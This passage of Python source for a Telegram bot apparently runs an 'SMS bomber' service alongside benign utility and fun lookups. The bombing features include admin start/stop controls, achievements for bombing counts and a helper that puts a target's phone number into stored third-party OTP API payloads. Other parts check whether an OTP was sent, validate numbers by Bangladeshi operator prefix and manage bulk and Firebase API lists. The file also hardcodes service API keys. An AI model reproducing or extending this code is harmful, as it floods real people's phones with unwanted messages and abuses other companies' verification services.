        return await cursor.fetchall()
    except Exception as e:
        logger.error(f"list_welcome_media error: {e}")
        return []

def get_media_manager_menu():
    """Media Manager keyboard"""
    keyboard = [
        ["🎬 Add Media", "📋 List Media"],
        ["🟢 Enable Media", "🔴 Disable Media"],
        ["🎲 Mode: Random", "🗑️ Delete Media"],
        ["🧪 Test Welcome Media", "🔙 Back to Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_backup_manager_menu():
    """Backup Manager keyboard"""
    keyboard = [
        ["💾 Backup Now", "📥 Import DB"],
        ["🟢 Enable AutoBackup", "🔴 Disable AutoBackup"],
        ["⏰ Set Interval", "📋 Backup Status"],
        ["📤 Export JSON", "📤 Export SQLite"],
        ["🔙 Back to Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===================== AUTO BACKUP MANAGER =====================
async def export_sqlite_copy(dest_path: str) -> bool:
    """Safe copy of current SQLite DB."""
    try:
        import shutil
        # Checkpoint WAL so copy is consistent
        try:
            conn = await get_db()
            await conn.execute("PRAGMA wal_checkpoint(FULL)")
            await conn.commit()
        except Exception:
            pass
        shutil.copy2(DB_PATH, dest_path)
        return True
    except Exception as e:
        logger.error(f"export_sqlite_copy error: {e}")
        return False

async def export_json_backup(dest_path: str) -> bool:
    """Dump all important tables to JSON."""
    try:
        conn = await get_db()
        tables = [
            "users", "redeem_codes", "redeem_history", "api_stats",
            "admin_logs", "apis", "bot_settings", "api_inventory",
            "api_usage", "achievements", "referrals", "welcome_media"
        ]
        dump = {"exported_at": datetime.now().isoformat(), "tables": {}}
        for t in tables:
            try:
                cursor = await conn.execute(f"SELECT * FROM {t}")
                cols = [d[0] for d in cursor.description] if cursor.description else []
                rows = await cursor.fetchall()
                dump["tables"][t] = [dict(zip(cols, row)) for row in rows]
            except Exception as te:
                dump["tables"][t] = {"error": str(te)}
        with open(dest_path, "w", encoding="utf-8") as f:
            json.dump(dump, f, ensure_ascii=False, indent=2, default=str)
        return True
    except Exception as e:
        logger.error(f"export_json_backup error: {e}")
        return False

async def send_backup_to_channel(context, file_path: str, caption: str):
    """Upload backup file to BACKUP_CHANNEL_ID (or LOG_CHANNEL as fallback)."""
    channel = BACKUP_CHANNEL_ID or LOG_CHANNEL_ID
    if not channel:
        logger.warning("No BACKUP_CHANNEL_ID or LOG_CHANNEL_ID set")
        return False
    try:
        with open(file_path, "rb") as f:
            await context.bot.send_document(
                chat_id=channel,
                document=f,
                caption=f"<blockquote>{caption}</blockquote>",
                parse_mode="HTML"
            )
        return True
    except Exception as e:
        logger.error(f"send_backup_to_channel error: {e}")
        return False

async def run_backup_once(context, reason: str = "manual"):
    """Create sqlite + json backups and upload to private channel."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("backups", exist_ok=True)
    sqlite_path = f"backups/bot_backup_{ts}.db"
    json_path = f"backups/bot_backup_{ts}.json"
    results = []

    formats = get_setting("backup_formats", "sqlite,json").lower().split(",")
    formats = [f.strip() for f in formats if f.strip()]

    if "sqlite" in formats:
        ok = await export_sqlite_copy(sqlite_path)
        if ok:
            cap = f"💾 SQLite Backup\nReason: {reason}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            await send_backup_to_channel(context, sqlite_path, cap)
            results.append("sqlite✅")
        else:
            results.append("sqlite❌")

    if "json" in formats:
        ok = await export_json_backup(json_path)
        if ok:
            cap = f"📄 JSON Backup\nReason: {reason}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            await send_backup_to_channel(context, json_path, cap)
            results.append("json✅")
        else:
            results.append("json❌")

    # cleanup local files older logic optional - keep last few
    try:
        files = sorted([f for f in os.listdir("backups") if f.startswith("bot_backup_")])
        while len(files) > 20:
            os.remove(os.path.join("backups", files.pop(0)))
    except Exception:
        pass

    return ", ".join(results) if results else "no formats"

async def backup_scheduler_loop(application):
    """Background loop: backup every N hours when enabled."""
    global BACKUP_TASK
    logger.info("Backup scheduler started")
    while True:
        try:
            enabled = get_setting("backup_enabled", "false") == "true"
            hours = float(get_setting("backup_interval_hours", "6") or "6")
            hours = max(0.25, hours)  # min 15 min
            if enabled and (BACKUP_CHANNEL_ID or LOG_CHANNEL_ID):
                # Build a minimal context-like object with bot
                class _Ctx:
                    bot = application.bot
                await run_backup_once(_Ctx(), reason=f"auto/{hours}h")
            await asyncio.sleep(hours * 3600)
        except asyncio.CancelledError:
            logger.info("Backup scheduler cancelled")
            break
        except Exception as e:
            logger.error(f"Backup scheduler error: {e}")
            await asyncio.sleep(60)

async def start_backup_scheduler(application):
    global BACKUP_TASK
    if BACKUP_TASK and not BACKUP_TASK.done():
        return
    BACKUP_TASK = asyncio.create_task(backup_scheduler_loop(application))

async def stop_backup_scheduler():
    global BACKUP_TASK
    if BACKUP_TASK and not BACKUP_TASK.done():
        BACKUP_TASK.cancel()
        try:
            await BACKUP_TASK
        except asyncio.CancelledError:
            pass
    BACKUP_TASK = None

async def import_json_backup(file_path: str) -> str:
    """Import JSON dump back into SQLite (upsert-style for key tables)."""
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            dump = json.load(f)
        tables = dump.get("tables", {})
        conn = await get_db()
        imported = []
        # Safe tables we allow restore into
        allowed = {"bot_settings", "apis", "redeem_codes", "welcome_media", "api_inventory"}
        for t, rows in tables.items():
            if t not in allowed or not isinstance(rows, list):
                continue
            for row in rows:
                if not isinstance(row, dict):
                    continue
                cols = list(row.keys())
                placeholders = ",".join(["?"] * len(cols))
                col_names = ",".join(cols)
                vals = [row[c] for c in cols]
                try:
                    await conn.execute(
                        f"INSERT OR REPLACE INTO {t} ({col_names}) VALUES ({placeholders})",
                        vals
                    )
                except Exception:
                    pass
            imported.append(t)
        await conn.commit()
        await load_settings()
        await load_apis()
        return "Imported: " + (", ".join(imported) if imported else "nothing")
    except Exception as e:
        logger.error(f"import_json_backup error: {e}")
        return f"Error: {e}"


# ===================== HELPERS =====================
def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', str(phone))
    return data

def check_success(text, status):
    keywords = ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done', 'submitted', 'received', 'message', 'delivered']
    if status in [200, 201, 202, 204, 302]:
        return any(word in text.lower() for word in keywords)
    return any(word in text.lower() for word in keywords)

def detect_operator(phone):
    if not phone or len(phone) < 3:
        return "Unknown"
    prefix = phone[:3]
    operators = {
        '017': '📱 Grameenphone',
        '018': '📱 Grameenphone',
        '019': '📱 Banglalink',
        '016': '📱 Teletalk',
        '015': '📱 Teletalk',
        '013': '📱 Robi',
        '014': '📱 Robi',
        '010': '📱 Robi',
    }
    return operators.get(prefix, '❓ Unknown')

def validate_phone(phone):
    if not phone or not phone.isdigit():
        return False, "Numbers only!"
    
    length = int(get_setting('phone_length', '11'))
    if len(phone) != length:
        return False, f"Enter {length} digit number!"
    
    prefixes = get_setting('phone_prefixes', '017,018,019,016,015,013,014,010').split(',')
    if prefixes != ['*'] and phone[:3] not in prefixes:
        return False, f"Invalid prefix! ({', '.join(prefixes)})"
    
    return True, "✅ Valid"

def progress_bar(current, total, length=15):
    if total <= 0:
        return "⬜" * length + " 0%"
    current = min(current, total)
    filled = int(length * current / total)
    bar = '🟩' * filled + '⬜' * (length - filled)
    return f"{bar} {round(current/total*100, 1)}%"

def generate_referral_code(user_id):
    return hashlib.md5(str(user_id).encode()).hexdigest()[:6].upper()

def is_premium_expired(expiry_date):
    if not expiry_date:
        return True
    try:
        expiry = datetime.fromisoformat(expiry_date)
        return datetime.now() > expiry
    except:
        return True

async def check_achievements(user_id):
    try:
        conn = await get_db()
        cursor = await conn.execute("SELECT total_sms, total_bombing, total_bulk FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if not row:
            return
        
        total_sms, total_bombing, total_bulk = row
        achievements = []
        if total_sms >= 100: achievements.append("📨 SMS Master")
        if total_sms >= 500: achievements.append("📨 SMS Legend")
        if total_bombing >= 50: achievements.append("💣 Bomber")
        if total_bombing >= 200: achievements.append("💣 Bomb Master")
        if total_bulk >= 20: achievements.append("📤 Bulk Master")
        
        for ach in achievements:
            await conn.execute("INSERT OR IGNORE INTO achievements (user_id, achievement_name) VALUES (?, ?)", (user_id, ach))
        await conn.commit()
    except Exception as e:
        logger.error(f"Achievement check error: {e}")

# ===================== GROUP MEMBERSHIP CHECK =====================
async def check_group_membership(user_id, context):
    """Check if user is in required group. Returns False if not in group."""
    required_group = get_setting('required_group', '').strip()
    if not required_group:
        return True  # No group set
    
    try:
        chat_member = await context.bot.get_chat_member(chat_id=int(required_group), user_id=user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
        else:
            return False
    except Exception as e:
        logger.error(f"Group check error: {e}")
        return False

async def send_group_required_message(update_or_query, context):
    """Send group join message (for both message and callback)"""
    # Select chat ID and reply function
    if hasattr(update_or_query, 'callback_query'):
        query = update_or_query.callback_query
        reply_func = query.message.reply_text
        is_callback = True
    else:
        reply_func = update_or_query.message.reply_text
        is_callback = False

    required_group = get_setting('required_group', '').strip()
    if not required_group:
        return
    
    group_link = None
    try:
        group_info = await context.bot.get_chat(chat_id=int(required_group))
        if group_info.invite_link:
            group_link = group_info.invite_link
        elif group_info.username:
            group_link = f"https://t.me/{group_info.username}"
    except:
        pass
    
    text = get_setting('welcome_message', '🔥 Welcome! Join our group to use the bot.')
    if group_link:
        text += f"\n\n👉 [Join Group]({group_link})"
    else:
        text += f"\n\n👉 Group ID: `{required_group}`"
    
    keyboard = []
    if group_link:
        keyboard.append([InlineKeyboardButton("📢 Join Group", url=group_link)])
    keyboard.append([InlineKeyboardButton("✅ Check", callback_data="check_group")])
    
    await reply_func(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

async def check_group_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback for '✅ Check' inline button"""
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    # Admin check
    if user_id == ADMIN_ID:
        await query.edit_message_text("✅ You are admin, no group check needed.", reply_markup=None)
        await query.message.reply_text("🛡️ Admin Panel", reply_markup=get_admin_main_menu())
        return
    
    in_group = await check_group_membership(user_id, context)
    if in_group:
        await query.edit_message_text("✅ You are in the group! You can now use the bot.", reply_markup=None)
        # Show main menu
        conn = await get_db()
        cursor = await conn.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        balance = row[0] if row else 0
        await query.message.reply_text(
            f"🔥 Welcome! Your balance: {balance}\n📌 Select an option:",
            reply_markup=get_main_keyboard()
        )
    else:
        # If still not in group, send message again
        await send_group_required_message(update, context)

# ===================== BOMBING CONTROL =====================
async def stop_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ This command is admin only!")
        return
    
    global BOMBING_ACTIVE, BOMBING_TASKS
    
    for user_id in list(BOMBING_TASKS.keys()):
        if user_id in BOMBING_TASKS:
            BOMBING_TASKS[user_id]['active'] = False
            await asyncio.sleep(2)
            if user_id in BOMBING_TASKS:
                del BOMBING_TASKS[user_id]
    
    BOMBING_ACTIVE = False
    
    await update.message.reply_text(
        "⛔ **Bombing Stopped!**\n\n"
        "📌 No more bombing requests will be accepted.\n"
        "✅ Click '✅ Start Bombing' to enable again.",
        parse_mode="Markdown",
        reply_markup=get_admin_main_menu()
    )
    await admin_log(ADMIN_ID, "Stopped Bombing", None, "Bombing stopped by admin")

    # ===== PRIVATE LOG: Admin stopped bombing =====
    try:
        admin = update.effective_user
        await log_admin_action(
            context,
            admin,
            "⛔ STOPPED BOMBING",
            "All bombing requests disabled by admin"
        )
    except Exception as e:
        logger.error(f"Admin stop log error: {e}")

async def start_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ This command is admin only!")
        return
    
    global BOMBING_ACTIVE
    BOMBING_ACTIVE = True
    
    await update.message.reply_text(
        "✅ **Bombing Started!**\n\n"
        "📌 Bombing requests will now be accepted.",
        parse_mode="Markdown",
        reply_markup=get_admin_main_menu()
    )
    await admin_log(ADMIN_ID, "Started Bombing", None, "Bombing started by admin")

    # ===== PRIVATE LOG: Admin started bombing =====
    try:
        admin = update.effective_user
        await log_admin_action(
            context,
            admin,
            "✅ STARTED BOMBING",
            "Bombing requests enabled by admin"
        )
    except Exception as e:
        logger.error(f"Admin start log error: {e}")

# ===================== COLOR THEMED KEYBOARDS =====================

def get_main_keyboard():
    """🟦 Main Menu - Blue Theme"""
    keyboard = [
        ["🟦 📨 Send SMS", "🟦 💣 SMS Bomber"],
        ["🟦 📤 Bulk SMS", "🟦 👤 My Profile"],
        ["🟦 🎁 Redeem Code", "🟦 📞 Support"],
        ["🟦 ⭐ Daily Bonus", "🟦 🏆 Leaderboard"],
        ["🟦 👑 Premium", "🟦 🎯 Smart Bombing"],
        ["🟦 🔮 Utilities", "🟦 🎮 Fun"],
        ["🟦 ⚽ Sports", "🟦 💰 Finance"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_utilities_keyboard():
    """🟩 Utilities Menu - Green Theme"""
    keyboard = [
        ["🟩 🌐 IP Info", "🟩 💰 Bitcoin Price"],
        ["🟩 🥇 Gold Price", "🟩 🦠 COVID-19"],
        ["🟩 💱 Currency Converter", "🟩 📡 Service Status"],
        ["🟩 🌤️ Weather", "🟩 🎬 Movie Info"],
        ["🟩 📮 ZIP Code", "🟩 🏛️ Universities"],
        ["🟩 📰 News", "🟩 🔙 Main Menu"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_fun_keyboard():
    """🟪 Fun Menu - Purple Theme"""
    keyboard = [
        ["🟪 😂 Random Joke", "🟪 🐕 Random Dog"],
        ["🟪 🎯 Random Activity", "🟪 👤 Random User"],
        ["🟪 💬 Random Quote", "🟪 🎂 Age Predictor"],
        ["🟪 🧑‍🤝‍🧑 Gender Predictor", "🟪 🌍 Nationality Predictor"],
        ["🟪 🔙 Main Menu"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_sports_keyboard():
    """🟧 Sports Menu - Orange Theme"""
    keyboard = [
        ["🟧 ⚽ Football Predictions", "🟧 🏏 Cricket"],
        ["🟧 🏀 Basketball", "🟧 🎾 Tennis"],
        ["🟧 🔙 Main Menu"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_finance_keyboard():
    """🟨 Finance Menu - Yellow Theme"""
    keyboard = [
        ["🟨 💰 Bitcoin Price", "🟨 🥇 Gold Price"],
        ["🟨 💱 Currency Converter", "🟨 📈 Stock Market"],
        ["🟨 🏦 Bank Rates", "🟨 💳 Crypto Prices"],
        ["🟨 🔙 Main Menu"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_main_menu():
    """🟥 Admin Menu - Red Theme"""
    keyboard = [
        ["🟥 📊 Management", "🟥 📨 Campaign"],
        ["🟥 🔧 Settings", "🟥 📈 Reports"],
        ["🟥 📊 API Inventory", "🟥 🎁 Daily Bonus Control"],
        ["🟥 🎟️ Redeem Control", "🟥 💰 Balance Control"],
        ["🟥 👥 User Control", "🟥 📡 API Manager"],
        ["🟥 ⛔ Stop Bombing", "🟥 ✅ Start Bombing"],
        ["🟥 🎬 Media Manager", "🟥 💾 Backup Manager"],
        ["🟥 📅 Daily Active Users", "🟥 📡 Monitor"],
        ["🟥 🔄 Restart Bot", "🟥 🔙 Exit Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_management_menu():
    """🟧 Management Menu - Orange Theme"""
    keyboard = [
        ["🟧 🟢 Add Credit", "🟧 🔴 Remove Credit"],
        ["🟧 👥 Users List", "🟧 🏆 Top Users"],
        ["🟧 💰 Total Balance", "🟧 🔙 Back to Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_campaign_menu():
    """🩷 Campaign Menu - Pink Theme"""
    keyboard = [
        ["🩷 📤 Bulk SMS", "🩷 💣 Bomber"],
        ["🩷 📣 Broadcast", "🩷 🎟️ Create Code"],
        ["🩷 🔙 Back to Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_settings_menu():
    """⬜ Settings Menu - White/Gray Theme"""
    keyboard = [
        ["⬜ 📋 API List", "⬜ 📊 API Inventory"],
        ["⬜ 🔑 SMS API Manager", "⬜ 📜 Admin Logs"],
        ["⬜ 🗑️ Clear Logs", "⬜ 🧪 Test API"],
        ["⬜ 📝 Welcome Message", "⬜ 👥 Required Group"],
        ["⬜ 🔙 Back to Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_reports_menu():
    """🟦 Reports Menu - Blue Theme"""
    keyboard = [
        ["🟦 📊 Live Stats", "🟦 📈 API Stats"],
        ["🟦 📅 Daily Active Users", "🟦 📡 Monitor"],
        ["🟦 🔙 Back to Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_api_inventory_menu():
    """🟪 API Inventory Menu - Purple Theme"""
    keyboard = [
        ["🟪 📊 View All APIs", "🟪 💰 Recharge API"],
        ["🟪 🔙 Back to Settings"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_api_manager_menu():
    """🟦 API Manager Menu - Blue Theme"""
    keyboard = [
        ["🟦 ➕ Add API", "🟦 ✏️ Edit API"],
        ["🟦 🗑️ Delete API", "🟦 🔄 Toggle API"],
        ["🟦 📋 View APIs", "🟦 🔙 Back to Admin"],
        ["🟦 ⚡ Simple Add API", "🟦 📦 Bulk Add APIs"],
        ["🟦 🧪 Test All APIs", "🟦 🗑️ Delete Inactive"],
        ["🟦 📦 Bulk Add Large", "🟦 🤖 Auto Delete Inactive"],
        ["🟦 🔥 Firebase Manager", "🟦 🔥 Remove Dead Firebase"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_firebase_manager_menu():
    """Firebase API Manager"""
    keyboard = [
        ["🔥 Add Firebase URL", "🔥 Add Firebase TXT"],
        ["🔥 List Firebase", "🔥 Test Firebase"],
        ["🔥 Keep Active Only", "🔥 Remove Dead Firebase"],
        ["🔙 Back to API Manager"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_sms_api_menu():
    """🟨 SMS API Menu - Yellow Theme"""
    keyboard = [
        ["🟨 🔑 Set SMS API Key", "🟨 🌐 Set SMS API URL"],
        ["🟨 📋 View SMS API", "🟨 🧪 Test API"],
        ["🟨 🔙 Back to Settings"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    """⬜ Back Button - White Theme"""
    keyboard = [["⬜ 🔙 Back"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===================== UTILITY API FUNCTIONS =====================

# 1. IP Info
async def get_ip_info(ip=None):
    if not ip:
        ip = "me"
    try:
        success, text, status = await safe_api_call(f"https://ipinfo.io/{ip}/geo", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"📍 **IP Info**\n\n" \
                   f"🌐 IP: `{data.get('ip', 'N/A')}`\n" \
                   f"📍 Location: {data.get('city', 'N/A')}, {data.get('region', 'N/A')}\n" \
                   f"🌍 Country: {data.get('country', 'N/A')}\n" \
                   f"📮 Postal: {data.get('postal', 'N/A')}\n" \
                   f"📞 Carrier: {data.get('org', 'N/A')}"
        return "❌ IP info not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 2. Bitcoin Price
async def get_bitcoin_price():
    try:
        success, text, status = await safe_api_call(
            "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd,bdt,eur,gbp,inr",
            method='GET', timeout=10
        )
        if success:
            data = json.loads(text)
            btc = data.get('bitcoin', {})
            return f"💰 **Bitcoin Price**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                   f"🇺🇸 USD: ${btc.get('usd', 'N/A')}\n" \
                   f"🇧🇩 BDT: ৳{round(btc.get('bdt', 0) or (btc.get('usd', 0) * 110), 2)}\n" \
                   f"🇪🇺 EUR: €{btc.get('eur', 'N/A')}\n" \
                   f"🇬🇧 GBP: £{btc.get('gbp', 'N/A')}\n" \
                   f"🇮🇳 INR: ₹{btc.get('inr', 'N/A')}\n\n" \
                   f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return "❌ Bitcoin price not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 3. Gold Price
async def get_gold_price():
    try:
        success, text, status = await safe_api_call("https://api.gold-api.com/price/XAU", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"🥇 **Gold Price**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                   f"💰 Price: ${data.get('price', 'N/A')}/oz\n" \
                   f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return "❌ Gold price not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 4. COVID-19 Data
async def get_covid_data():
    try:
        success, text, status = await safe_api_call("https://disease.sh/v3/covid-19/all", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"🦠 **COVID-19 Global Data**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                   f"📊 Total Cases: {data.get('cases', 0):,}\n" \
                   f"✅ Recovered: {data.get('recovered', 0):,}\n" \
                   f"💀 Deaths: {data.get('deaths', 0):,}\n" \
                   f"📈 Today Cases: {data.get('todayCases', 0):,}\n" \
                   f"💉 Vaccinated: {data.get('vaccinated', 0):,}\n" \
                   f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return "❌ COVID-19 data not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 5. Currency Converter
async def convert_currency(from_currency, to_currency, amount):
    try:
        success, text, status = await safe_api_call(
            f"https://api.exchangerate-api.com/v4/latest/{from_currency.upper()}",
            method='GET', timeout=10
        )
        if success:
            data = json.loads(text)
            rates = data.get('rates', {})
            rate = rates.get(to_currency.upper())
            if rate:
                converted = amount * rate
                return f"💱 **Currency Converter**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                       f"💰 {amount} {from_currency.upper()} = {converted:.2f} {to_currency.upper()}\n" \
                       f"📊 Rate: 1 {from_currency.upper()} = {rate:.2f} {to_currency.upper()}"
            return f"❌ {to_currency.upper()} not found!"
        return "❌ Currency conversion failed!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 6. Service Status
async def check_service_status(service):
    services = {
        'github': 'GitHub',
        'stripe': 'Stripe',
        'aws': 'AWS',
        'google': 'Google',
        'facebook': 'Facebook',
        'twitter': 'Twitter',
        'discord': 'Discord',
        'telegram': 'Telegram',
        'youtube': 'YouTube',
        'instagram': 'Instagram'
    }
    service_name = services.get(service.lower(), service)
    try:
        success, text, status = await safe_api_call(f"https://isitdownstatus.com/api/v1/status/{service.lower()}", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"📡 **{service_name} Status**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                   f"🚦 Status: {'✅ Online' if data.get('status') == 'online' else '❌ Offline'}\n" \
                   f"📝 Details: {data.get('message', 'N/A')}\n" \
                   f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        return f"❌ {service_name} status not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 7. Weather
async def get_weather(city):
    try:
        success, text, status = await safe_api_call(
            f"https://api.openweathermap.org/data/2.5/weather?q={city}&appid=bd5e378503939ddaee76f12ad7a97608&units=metric",
            method='GET', timeout=10
        )
        if success:
            data = json.loads(text)
            if data.get('main'):
                return f"🌤️ **Weather - {city}**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                       f"🌡️ Temperature: {data['main']['temp']}°C\n" \
                       f"🔥 Feels Like: {data['main']['feels_like']}°C\n" \
                       f"💧 Humidity: {data['main']['humidity']}%\n" \
                       f"☁️ Condition: {data['weather'][0]['description']}\n" \
                       f"💨 Wind: {data['wind']['speed']} m/s"
            return f"❌ Weather for {city} not found!"
        return "❌ Weather not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 8. Movie Info
async def get_movie_info(title):
    try:
        success, text, status = await safe_api_call(
            f"http://www.omdbapi.com/?t={title}&apikey=9f5a7d8e",
            method='GET', timeout=10
        )
        if success:
            data = json.loads(text)
            if data.get('Response') == 'True':
                return f"🎬 **Movie Info**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                       f"📽️ Title: {data.get('Title', 'N/A')}\n" \
                       f"📅 Year: {data.get('Year', 'N/A')}\n" \
                       f"⭐ Rating: {data.get('imdbRating', 'N/A')}/10\n" \
                       f"🎭 Genre: {data.get('Genre', 'N/A')}\n" \
                       f"🎬 Director: {data.get('Director', 'N/A')}\n" \
                       f"👥 Actors: {data.get('Actors', 'N/A')}\n" \
                       f"📝 Plot: {data.get('Plot', 'N/A')[:200]}..."
            return f"❌ Movie '{title}' not found!"
        return "❌ Movie info not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 9. ZIP Code Info
async def get_zip_info(country, zip_code):
    try:
        success, text, status = await safe_api_call(f"https://api.zippopotam.us/{country}/{zip_code}", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            places = data.get('places', [])
            if places:
                place = places[0]
                return f"📮 **ZIP Code Info**\n\n" \
                       f"📍 Location: {place.get('place name', 'N/A')}\n" \
                       f"🌍 State: {place.get('state', 'N/A')}\n" \
                       f"📮 ZIP: {data.get('post code', 'N/A')}\n" \
                       f"🌐 Country: {data.get('country', 'N/A')}\n" \
                       f"📞 Area Code: {place.get('state abbreviation', 'N/A')}"
        return "❌ ZIP code info not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 10. Universities
async def get_universities(country):
    try:
        success, text, status = await safe_api_call(f"http://universities.hipolabs.com/search?country={country}", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            if data:
                result = f"🏛️ **University List - {country}**\n━━━━━━━━━━━━━━━━━━━\n\n"
                for uni in data[:10]:
                    result += f"📌 {uni.get('name', 'N/A')}\n"
                    result += f"   🌐 {uni.get('web_pages', ['N/A'])[0]}\n\n"
                return result
            return f"❌ No universities found for {country}!"
        return "❌ Universities not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 11. News
async def get_news():
    try:
        success, text, status = await safe_api_call(
            "https://newsapi.org/v2/top-headlines?country=us&apiKey=9f5a7d8e",
            method='GET', timeout=10
        )
        if success:
            data = json.loads(text)
            articles = data.get('articles', [])[:5]
            result = "📰 **Breaking News**\n━━━━━━━━━━━━━━━━━━━\n\n"
            for article in articles:
                result += f"📌 {article.get('title', 'N/A')}\n"
                result += f"   {article.get('description', '')[:100]}...\n\n"
            return result
        return "❌ News not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ===================== FUN API FUNCTIONS =====================

# 12. Random Joke
async def get_random_joke():
    try:
        success, text, status = await safe_api_call("https://official-joke-api.appspot.com/random_joke", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"😂 **Random Joke**\n\n" \
                   f"📝 {data.get('setup', '')}\n\n" \
                   f"😄 {data.get('punchline', '')}"
        return "❌ Joke not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 13. Random Dog
async def get_random_dog():
    try:
        success, text, status = await safe_api_call("https://dog.ceo/api/breeds/image/random", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"🐕 **Random Dog**\n\n🖼️ [View Image]({data.get('message', '')})"
        return "❌ Dog image not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 14. Random Activity
async def get_random_activity():
    try:
        success, text, status = await safe_api_call("https://bored-api.appbrewery.com/random", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"🎯 **Random Activity**\n\n" \
                   f"📌 {data.get('activity', 'N/A')}\n" \
                   f"🔰 Type: {data.get('type', 'N/A')}\n" \
                   f"👥 Participants: {data.get('participants', 0)}\n" \
                   f"💰 Price: {data.get('price', 0)}"
        return "❌ Activity not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 15. Random User
async def get_random_user():
    try:
        success, text, status = await safe_api_call("https://randomuser.me/api/", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            user = data['results'][0]
            return f"👤 **Random User**\n\n" \
                   f"📛 Name: {user['name']['first']} {user['name']['last']}\n" \
                   f"🧑‍💼 Gender: {user['gender']}\n" \
                   f"📧 Email: {user['email']}\n" \
                   f"📱 Phone: {user['phone']}\n" \
                   f"📍 Country: {user['location']['country']}\n" \
                   f"🏙️ City: {user['location']['city']}\n" \
                   f"🎂 Age: {user['dob']['age']}"
        return "❌ Random user not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 16. Random Quote
async def get_random_quote():
    try:
        success, text, status = await safe_api_call("https://api.quotable.io/random", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"💬 **Random Quote**\n━━━━━━━━━━━━━━━━━━━\n\n" \
                   f"\"{data.get('content', 'N/A')}\"\n\n" \
                   f"— {data.get('author', 'N/A')}"
        return "❌ Quote not found!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# 17. Age Predictor
async def get_age_by_name(name):
    try:
        success, text, status = await safe_api_call(f"https://api.agify.io?name={name}", method='GET', timeout=10)
        if success:
            data = json.loads(text)
            return f"🎂 **Age Prediction**\n\n" \
                   f"📛 Name: {data.get('name', 'N/A')}\n" \
                   f"🎂 Age: {data.get('age', 'N/A')} years\n" \
